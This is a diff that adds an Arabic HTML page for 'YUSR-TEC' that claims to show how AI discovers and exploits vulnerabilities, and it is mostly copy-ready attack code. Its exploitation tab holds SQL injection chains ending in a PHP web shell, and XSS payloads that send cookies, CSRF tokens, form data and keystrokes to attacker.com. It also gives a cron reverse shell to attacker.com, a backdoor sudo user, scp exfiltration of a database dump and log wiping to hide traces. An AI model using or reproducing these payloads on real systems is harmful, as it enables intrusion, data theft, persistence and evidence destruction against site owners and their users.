@@ -1,0 +1,773 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>YUSR-TEC - تحليل الذكاء الاصطناعي المتقدم</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .analysis-container {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            border: 2px solid #00ff00;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px 0;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+        
+        .phase-section {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            border-left: 4px solid #00ff00;
+        }
+        
+        .code-block {
+            background: #000;
+            border: 2px solid #00ff00;
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            white-space: pre-wrap;
+            overflow-x: auto;
+            margin: 10px 0;
+            position: relative;
+        }
+        
+        .tool-card {
+            background: linear-gradient(45deg, #1a1a1a, #2a2a2a);
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 10px;
+            display: inline-block;
+            min-width: 250px;
+            vertical-align: top;
+        }
+        
+        .vulnerability-card {
+            background: linear-gradient(135deg, #2a0000, #4a0000);
+            border: 2px solid #ff4444;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            box-shadow: 0 0 15px rgba(255, 68, 68, 0.3);
+        }
+        
+        .exploit-section {
+            background: #1a0000;
+            border: 2px solid #ff0000;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        
+        .ai-decision {
+            background: linear-gradient(45deg, #001a33, #003366);
+            border: 2px solid #0066cc;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            color: #66ccff;
+        }
+        
+        .methodology-steps {
+            counter-reset: step-counter;
+        }
+        
+        .methodology-step {
+            counter-increment: step-counter;
+            background: #1a1a1a;
+            border-left: 4px solid #00ff00;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            position: relative;
+        }
+        
+        .methodology-step::before {
+            content: counter(step-counter);
+            background: #00ff00;
+            color: #000;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: absolute;
+            left: -15px;
+            top: 15px;
+            font-weight: bold;
+        }
+        
+        .copy-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: #333;
+            color: #fff;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        .severity-critical { border-left-color: #ff0000; }
+        .severity-high { border-left-color: #ff6600; }
+        .severity-medium { border-left-color: #ffcc00; }
+        .severity-low { border-left-color: #00ff00; }
+        
+        .network-diagram {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .tabs {
+            display: flex;
+            background: #1a1a1a;
+            border-radius: 10px 10px 0 0;
+            overflow: hidden;
+        }
+        
+        .tab {
+            padding: 15px 25px;
+            background: #333;
+            color: #fff;
+            cursor: pointer;
+            border: none;
+            flex: 1;
+            transition: all 0.3s;
+        }
+        
+        .tab.active {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        .tab-content {
+            display: none;
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 0 0 10px 10px;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="YUSR-BLACK.png" alt="YUSR-TEC Logo" class="logo">
+        <h1>🧠 تحليل الذكاء الاصطناعي المتقدم - YUSR-TEC</h1>
+        <nav style="margin-top: 15px;">
+            <button onclick="window.location.href='index.html'" style="background: #666;">🏠 الصفحة الرئيسية</button>
+            <button onclick="window.location.href='reports.html'" style="background: #666; margin: 0 10px;">📊 التقارير</button>
+            <button onclick="window.location.href='hacker.html'" style="background: #ff0000; margin: 0 10px;">⚡ الاختراق الذكي</button>
+            <button onclick="window.location.href='analysis.html'" class="ai-button">🧠 التحليل المتقدم</button>
+        </nav>
+    </div>
+
+    <div class="container">
+        <div class="analysis-container">
+            <h2>🤖 كيف يعمل الذكاء الاصطناعي في اكتشاف الثغرات والاختراق</h2>
+            <p>هذه الصفحة تُظهر العملية الكاملة لكيفية اكتشاف وإنشاء واستغلال الثغرات بالذكاء الاصطناعي</p>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('ai-discovery')">🔍 اكتشاف الثغرات</button>
+            <button class="tab" onclick="showTab('tools-analysis')">🛠️ تحليل الأدوات</button>
+            <button class="tab" onclick="showTab('exploitation')">⚡ الاستغلال</button>
+            <button class="tab" onclick="showTab('methodology')">📚 المنهجية</button>
+        </div>
+
+        <!-- Tab 1: AI Bug Discovery -->
+        <div id="ai-discovery" class="tab-content active">
+            <div class="phase-section">
+                <h3>🧠 مرحلة 1: التحليل الذكي للهدف</h3>
+                <div class="ai-decision">
+                    <h4>🎯 قرار الذكاء الاصطناعي</h4>
+                    <p>يقوم الAI بتحليل الهدف وتحديد أفضل استراتيجية للفحص:</p>
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+AI Target Analysis:
+Target: example.com
+Target Type: Web Application
+Risk Level: High
+Attack Surface: Large
+
+AI Decision Process:
+1. Domain analysis → Web application detected
+2. Technology stack detection → PHP/MySQL
+3. Security posture assessment → Weak
+4. Attack vector prioritization → SQL Injection, XSS
+5. Tool selection optimization → SQLMap, Nikto, Burp Suite
+
+Recommended Approach: Multi-vector attack
+Priority: Critical vulnerabilities first
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-section">
+                <h3>🔍 مرحلة 2: الاستطلاع الذكي</h3>
+                <div class="methodology-steps">
+                    <div class="methodology-step">
+                        <h4>جمع المعلومات السلبي</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Passive Information Gathering
+whois example.com
+dig example.com
+nslookup example.com
+theHarvester -d example.com -b all
+amass enum -d example.com
+                        </div>
+                        <p><strong>النتائج:</strong> تم اكتشاف 15 subdomain، 3 email addresses، تقنيات مستخدمة</p>
+                    </div>
+
+                    <div class="methodology-step">
+                        <h4>مسح الشبكة النشط</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Network Scanning
+nmap -sS -sV -sC -A example.com
+nmap -p- --min-rate 1000 example.com
+masscan -p1-65535 example.com --rate=1000
+
+Results:
+22/tcp   open  ssh     OpenSSH 7.4
+80/tcp   open  http    Apache/2.4.41
+443/tcp  open  https   Apache/2.4.41
+3306/tcp open  mysql   MySQL 5.7.33
+                        </div>
+                    </div>
+
+                    <div class="methodology-step">
+                        <h4>تعداد الخدمات</h4>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Service Enumeration
+nikto -h example.com
+dirb http://example.com /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Discovered:
+/admin/           (Status: 200)
+/backup/          (Status: 403)
+/config.php       (Status: 200)
+/uploads/         (Status: 301)
+/phpmyadmin/      (Status: 200)
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="vulnerability-card severity-critical">
+                <h3>🚨 ثغرة مكتشفة: SQL Injection</h3>
+                <p><strong>الموقع:</strong> /login.php - parameter: username</p>
+                <p><strong>النوع:</strong> Boolean-based blind SQL injection</p>
+                <p><strong>CVSS Score:</strong> 9.8 (Critical)</p>
+                
+                <h4>🔬 عملية الاكتشاف:</h4>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Manual Testing
+curl -X POST http://example.com/login.php -d "username=admin'&password=test"
+Response: MySQL syntax error
+
+# SQLMap Automation
+sqlmap -u "http://example.com/login.php" --data="username=test&password=test" --dbs
+sqlmap -u "http://example.com/login.php" --data="username=test&password=test" -D myapp --tables
+sqlmap -u "http://example.com/login.php" --data="username=test&password=test" -D myapp -T users --dump
+
+Results:
+- Database: myapp
+- Tables: users, admin, logs
+- Dumped 1500 user credentials
+                </div>
+            </div>
+
+            <div class="vulnerability-card severity-high">
+                <h3>⚠️ ثغرة مكتشفة: Cross-Site Scripting (XSS)</h3>
+                <p><strong>الموقع:</strong> /search.php - parameter: q</p>
+                <p><strong>النوع:</strong> Reflected XSS</p>
+                <p><strong>CVSS Score:</strong> 8.1 (High)</p>
+                
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# XSS Discovery Process
+# Basic payload test
+http://example.com/search.php?q=<script>alert('XSS')</script>
+
+# Filter bypass techniques
+http://example.com/search.php?q=<img src=x onerror=alert('XSS')>
+http://example.com/search.php?q=<svg onload=alert('XSS')>
+http://example.com/search.php?q=javascript:alert('XSS')
+
+# Advanced payload for session hijacking
+http://example.com/search.php?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tab 2: Tools Analysis -->
+        <div id="tools-analysis" class="tab-content">
+            <h3>🛠️ الأدوات المستخدمة في التحليل</h3>
+            
+            <div class="tool-card">
+                <h4>🗺️ Nmap - Network Mapper</h4>
+                <p><strong>الغرض:</strong> مسح الشبكة واكتشاف المنافذ</p>
+                <p><strong>القدرات:</strong></p>
+                <ul>
+                    <li>Port scanning</li>
+                    <li>Service detection</li>
+                    <li>OS fingerprinting</li>
+                    <li>Vulnerability scripts</li>
+                </ul>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Advanced Nmap Usage
+nmap -sS -sV -sC -A -T4 target
+nmap --script vuln target
+nmap --script "default and safe" target
+                </div>
+            </div>
+
+            <div class="tool-card">
+                <h4>💉 SQLMap - SQL Injection Tool</h4>
+                <p><strong>الغرض:</strong> اكتشاف واستغلال ثغرات SQL Injection</p>
+                <p><strong>القدرات:</strong></p>
+                <ul>
+                    <li>Automatic SQL injection detection</li>
+                    <li>Database enumeration</li>
+                    <li>Data extraction</li>
+                    <li>Shell access</li>
+                </ul>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# SQLMap Commands
+sqlmap -u "http://target/page?id=1" --dbs
+sqlmap -u "http://target/page?id=1" --current-db
+sqlmap -u "http://target/page?id=1" --tables
+sqlmap -u "http://target/page?id=1" --dump
+                </div>
+            </div>
+
+            <div class="tool-card">
+                <h4>🕷️ Nikto - Web Scanner</h4>
+                <p><strong>الغرض:</strong> فحص تطبيقات الويب للثغرات</p>
+                <p><strong>القدرات:</strong></p>
+                <ul>
+                    <li>6700+ vulnerability checks</li>
+                    <li>Server configuration issues</li>
+                    <li>Outdated software detection</li>
+                    <li>Dangerous files/programs</li>
+                </ul>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Nikto Scanning
+nikto -h http://target
+nikto -h http://target -port 8080,8443
+nikto -h http://target -Tuning 1,2,3,4,5
+                </div>
+            </div>
+
+            <div class="tool-card">
+                <h4>🔬 Burp Suite - Web Application Security</h4>
+                <p><strong>الغرض:</strong> تحليل شامل لتطبيقات الويب</p>
+                <p><strong>القدرات:</strong></p>
+                <ul>
+                    <li>Proxy & intercept</li>
+                    <li>Active/Passive scanning</li>
+                    <li>Vulnerability assessment</li>
+                    <li>Manual testing tools</li>
+                </ul>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Burp Suite Workflow
+1. Configure proxy (127.0.0.1:8080)
+2. Browse target application
+3. Spider/crawl the site
+4. Run active scanner
+5. Analyze results
+6. Manual verification
+                </div>
+            </div>
+
+            <div class="phase-section">
+                <h3>🤖 كيف يختار الذكاء الاصطناعي الأدوات</h3>
+                <div class="ai-decision">
+                    <h4>عملية اتخاذ القرار الآلي</h4>
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+AI Tool Selection Algorithm:
+
+1. Target Analysis:
+   - Input: IP/Domain/URL
+   - Analysis: Type detection (Web app/Network/API)
+   - Context: Technology stack identification
+
+2. Risk Assessment:
+   - Calculate attack surface
+   - Identify high-value targets
+   - Prioritize vulnerability types
+
+3. Tool Optimization:
+   - Match tools to target type
+   - Consider time constraints
+   - Optimize for accuracy vs speed
+
+4. Execution Strategy:
+   - Parallel vs sequential execution
+   - Resource allocation
+   - Result correlation
+
+Example Decision Tree:
+Target = Web Application:
+├── If PHP detected → Add SQLMap, WPScan
+├── If JavaScript heavy → Add XSS scanners
+├── If API endpoints → Add Postman, API fuzzers
+└── If CMS detected → Add CMS-specific tools
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tab 3: Exploitation -->
+        <div id="exploitation" class="tab-content">
+            <div class="exploit-section">
+                <h3>⚡ مرحلة الاستغلال المتقدم</h3>
+                
+                <h4>🎯 استغلال SQL Injection</h4>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Step 1: Identify injection point
+Original request: POST /login.php
+Data: username=admin&password=test123
+
+# Step 2: Test for vulnerability
+username=admin'&password=test123
+Response: MySQL syntax error - VULNERABLE!
+
+# Step 3: Determine injection type
+username=admin' OR '1'='1' --&password=anything
+Response: Login successful - Boolean-based injection confirmed
+
+# Step 4: Extract database information
+username=admin' UNION SELECT 1,2,3,4,5 --&password=test
+username=admin' UNION SELECT 1,database(),user(),version(),5 --&password=test
+Result: Database = 'company_db', User = 'webapp@localhost'
+
+# Step 5: Enumerate tables
+username=admin' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='company_db' --&password=test
+Result: Tables found = users, admin, financial_data, customers
+
+# Step 6: Extract sensitive data
+username=admin' UNION SELECT 1,username,password,email,5 FROM users --&password=test
+Result: admin:$2y$10$hash..., user1:$2y$10$hash2..., etc.
+
+# Step 7: Crack password hashes (if needed)
+john --wordlist=/usr/share/wordlists/rockyou.txt extracted_hashes.txt
+hashcat -m 3200 extracted_hashes.txt wordlist.txt
+
+# Step 8: Escalate to shell (if possible)
+username=admin' UNION SELECT 1,2,3,4,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --&password=test
+Access: http://target/shell.php?cmd=whoami
+                </div>
+
+                <h4>🚨 استغلال XSS للتحكم في الجلسات</h4>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# XSS Exploitation Chain
+
+# Step 1: Basic payload confirmation
+http://target/search.php?q=<script>alert('XSS')</script>
+
+# Step 2: Cookie stealing payload
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie, true);
+xhr.send();
+</script>
+
+# Step 3: Session hijacking
+<script>
+// Steal session tokens
+var session = document.cookie;
+var csrf = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+// Send to attacker server
+fetch('http://attacker.com/collect.php', {
+    method: 'POST',
+    body: JSON.stringify({
+        cookies: session,
+        csrf: csrf,
+        url: window.location.href,
+        userAgent: navigator.userAgent
+    })
+});
+</script>
+
+# Step 4: Admin panel access simulation
+<script>
+// Check if user is admin
+if(document.URL.includes('/admin/')) {
+    // Extract admin functionality
+    var forms = document.getElementsByTagName('form');
+    for(var i = 0; i < forms.length; i++) {
+        // Send form data to attacker
+        var formData = new FormData(forms[i]);
+        fetch('http://attacker.com/admin_data.php', {
+            method: 'POST',
+            body: formData
+        });
+    }
+}
+</script>
+
+# Step 5: Keylogger injection
+<script>
+document.addEventListener('keydown', function(event) {
+    fetch('http://attacker.com/keylog.php?key=' + event.key + '&target=' + document.URL);
+});
+</script>
+                </div>
+
+                <h4>🔐 Post-Exploitation Techniques</h4>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Post-Exploitation Checklist
+
+# 1. Privilege Escalation
+sudo -l                           # Check sudo permissions
+find / -perm -u=s -type f 2>/dev/null    # Find SUID binaries
+crontab -l                        # Check scheduled tasks
+cat /etc/passwd                   # Enumerate users
+
+# 2. Persistence Mechanisms
+# Add SSH key
+echo "ssh-rsa AAAAB3N..." >> ~/.ssh/authorized_keys
+
+# Create backdoor user
+useradd -m -s /bin/bash backdoor
+echo "backdoor:password123" | chpasswd
+usermod -aG sudo backdoor
+
+# Cron job backdoor
+echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /var/spool/cron/crontabs/root
+
+# 3. Data Exfiltration
+# Database dump
+mysqldump -u root -p company_db > /tmp/db_dump.sql
+scp /tmp/db_dump.sql attacker@attacker.com:/tmp/
+
+# File system search
+find / -name "*.txt" -o -name "*.pdf" -o -name "*.doc" 2>/dev/null
+find / -name "*password*" -o -name "*secret*" 2>/dev/null
+
+# 4. Network Pivoting
+# Port forwarding
+ssh -L 8080:internal-server:80 user@compromised-host
+
+# SOCKS proxy
+ssh -D 1080 user@compromised-host
+
+# 5. Covering Tracks
+# Clear logs
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+history -c
+rm ~/.bash_history
+                </div>
+            </div>
+        </div>
+
+        <!-- Tab 4: Methodology -->
+        <div id="methodology" class="tab-content">
+            <div class="phase-section">
+                <h3>📚 منهجية YUSR-TEC للاختبار الأمني</h3>
+                
+                <div class="network-diagram">
+                    <h4>🗺️ خريطة العملية الشاملة</h4>
+                    <pre style="color: #00ff00; font-family: monospace;">
+    [Target Identification] → [Reconnaissance] → [Scanning & Enumeration]
+            ↓                         ↓                      ↓
+    [Risk Assessment]        [OSINT Gathering]      [Service Detection]
+            ↓                         ↓                      ↓
+    [Attack Planning]        [Social Engineering]   [Vulnerability Assessment]
+            ↓                         ↓                      ↓
+    [Exploitation]      ←    [Payload Generation]   ←   [Proof of Concept]
+            ↓
+    [Post-Exploitation] → [Privilege Escalation] → [Persistence]
+            ↓                         ↓                      ↓
+    [Data Exfiltration]      [Lateral Movement]     [Evidence Collection]
+            ↓                         ↓                      ↓
+    [Report Generation]      [Cleanup]              [Recommendations]
+                    </pre>
+                </div>
+
+                <h4>🎯 المراحل التفصيلية</h4>
+                <div class="methodology-steps">
+                    <div class="methodology-step">
+                        <h4>التحضير والتخطيط</h4>
+                        <ul>
+                            <li>تحديد نطاق الاختبار</li>
+                            <li>الحصول على التصاريح القانونية</li>
+                            <li>إعداد البيئة والأدوات</li>
+                            <li>تحديد الأهداف والمخرجات المطلوبة</li>
+                        </ul>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Preparation Phase
+mkdir /pentest/target_company
+cd /pentest/target_company
+mkdir {recon,scanning,exploitation,post_exploit,reports}
+
+# Tool verification
+nmap --version
+sqlmap --version
+burpsuite --version
+metasploit --version
+                        </div>
+                    </div>
+
+                    <div class="methodology-step">
+                        <h4>جمع المعلومات (OSINT)</h4>
+                        <ul>
+                            <li>البحث في المصادر المفتوحة</li>
+                            <li>تحليل وسائل التواصل الاجتماعي</li>
+                            <li>جمع معلومات الموظفين</li>
+                            <li>تحليل التقنيات المستخدمة</li>
+                        </ul>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# OSINT Phase
+# Company information
+whois target.com
+dig target.com any
+fierce -dns target.com
+
+# Email harvesting
+theHarvester -d target.com -b all
+hunter.io search
+linkedin reconnaissance
+
+# Technology fingerprinting
+whatweb target.com
+wappalyzer analysis
+shodan search target.com
+                        </div>
+                    </div>
+
+                    <div class="methodology-step">
+                        <h4>المسح والتعداد</h4>
+                        <ul>
+                            <li>اكتشاف الأنظمة الحية</li>
+                            <li>مسح المنافذ والخدمات</li>
+                            <li>تحديد أنظمة التشغيل</li>
+                            <li>تعداد الخدمات والتطبيقات</li>
+                        </ul>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Scanning Phase
+# Host discovery
+nmap -sn 192.168.1.0/24
+
+# Port scanning
+nmap -sS -p- target.com
+nmap -sU --top-ports 1000 target.com
+
+# Service enumeration
+nmap -sV -sC target.com
+enum4linux target.com
+smbclient -L //target.com
+                        </div>
+                    </div>
+
+                    <div class="methodology-step">
+                        <h4>تقييم الثغرات</h4>
+                        <ul>
+                            <li>البحث عن الثغرات المعروفة</li>
+                            <li>تحليل التكوينات الخاطئة</li>
+                            <li>اختبار الثغرات اليدوي</li>
+                            <li>تصنيف المخاطر</li>
+                        </ul>
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+# Vulnerability Assessment
+# Automated scanning
+nessus -T template scan target.com
+openvas scan target.com
+nuclei -l targets.txt
+
+# Manual testing
+nikto -h target.com
+dirb http://target.com
+sqlmap -u "http://target.com/page?id=1"
+
+# SSL/TLS testing
+sslscan target.com
+testssl.sh target.com
+                        </div>
+                    </div>
+                </div>
+
+                <h4>📋 قائمة التحقق الشاملة</h4>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+YUSR-TEC Security Testing Checklist:
+
+□ Network Security:
+  □ Port scanning completed
+  □ Service enumeration done
+  □ Firewall rules tested
+  □ Network segmentation verified
+
+□ Web Application Security:
+  □ OWASP Top 10 tested
+  □ Input validation checked
+  □ Authentication mechanisms tested
+  □ Session management verified
+  □ Access control evaluated
+
+□ Infrastructure Security:
+  □ OS hardening verified
+  □ Patch levels checked
+  □ Service configurations reviewed
+  □ Log monitoring tested
+
+□ Social Engineering:
+  □ Phishing resistance tested
+  □ Physical security evaluated
+  □ Employee awareness checked
+
+□ Post-Exploitation:
+  □ Privilege escalation tested
+  □ Lateral movement evaluated
+  □ Data access verified
+  □ Persistence mechanisms tested
+
+□ Reporting:
+  □ Executive summary prepared
+  □ Technical details documented
+  □ Risk ratings assigned
+  □ Remediation steps provided
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="analysis.js"></script>
+</body>
+</html>
